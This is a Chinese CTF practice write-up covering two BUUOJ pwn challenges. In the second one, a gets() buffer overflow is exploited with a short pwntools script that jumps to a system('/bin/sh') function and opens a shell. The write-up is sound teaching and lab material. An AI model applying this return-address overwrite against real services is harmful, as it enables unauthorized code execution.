# PWN做题笔记

## 练习记录

### [PWN-test_your_nc](https://buuoj.cn/challenges#test_your_nc)

下载程序文件，使用 `file` 命令查看，发现这是个 Debian 64 位程序

使用 IDA 64 进行静态分析，找到主程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  system("/bin/sh");
  return 0;
}
```

emmmmmmmm...

显然直接 `nc` 到服务器里即可获得 flag

```shell
┌──(hervey㉿Hervey)-[~]
└─$ nc node5.buuoj.cn 29833
ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
cat flag
flag{<flag here>}
```

### [PWN-rip](https://buuoj.cn/challenges#rip)

下载后获得文件 pwn1

先使用 `file` 命令查看文件类型，发现是一个 ELF 64 位程序

```shell
┌──(hervey㉿Hervey)-[/mnt/c/Users/zhwaa/Downloads]
└─$ file pwn1
pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped
```

接着使用 `checksec` 命令识别安全属性

```shell
┌──(hervey㉿Hervey)-[/mnt/c/Users/zhwaa/Downloads]
└─$ checksec --file=pwn1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   64 Symbols        No    0               1               pwn1
```

可以发现无任何栈保护

使用 IDA 64 进行逆向

`main()` 函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rsp+1h] [rbp-Fh] BYREF

  puts("please input");
  gets(s, argv);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
```

同时我们还能找到一个 `fun` 函数

```c
int fun()
{
  return system("/bin/sh");
}
```

所以我们的目标应该是利用 `gets()` 这个危险函数的缓冲区溢出漏洞，将 `s` 变量数据溢出到覆盖返回地址，实现跳转到执行 `system("/bin/sh")` 进而去获得 flag

使用 IDA 64 可以轻松地获取 `s` 的地址为 `[rbp-Fh]`

点击 `fun()` 在窗口左下角可以获得该函数位于 `0x401186`

![PWN-rip-1](./Notes-on-PWN/PWN-rip-1.png)

当然，也可以直接从汇编界面找到该函数的地址

![PWN-rip-2](./Notes-on-PWN/PWN-rip-2.png)

![PWN-rip-3](./Notes-on-PWN/PWN-rip-3.png)

由此我们可以写出脚本

```python
from pwn import *
p = remote("<IP Address>", <Port>)
payload = b'A' * 0xF + p64(0x401186)
p.sendline(payload)
p.interactive()
```

运行该脚本，进入容器终端

```shell
┌──(hervey㉿Hervey)-[~/Downloads]
└─$ python3 ./sol.py
[+] Opening connection to <IP Address> on port <Port>: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag
flag{<flag here>}
```

进而获得 flag
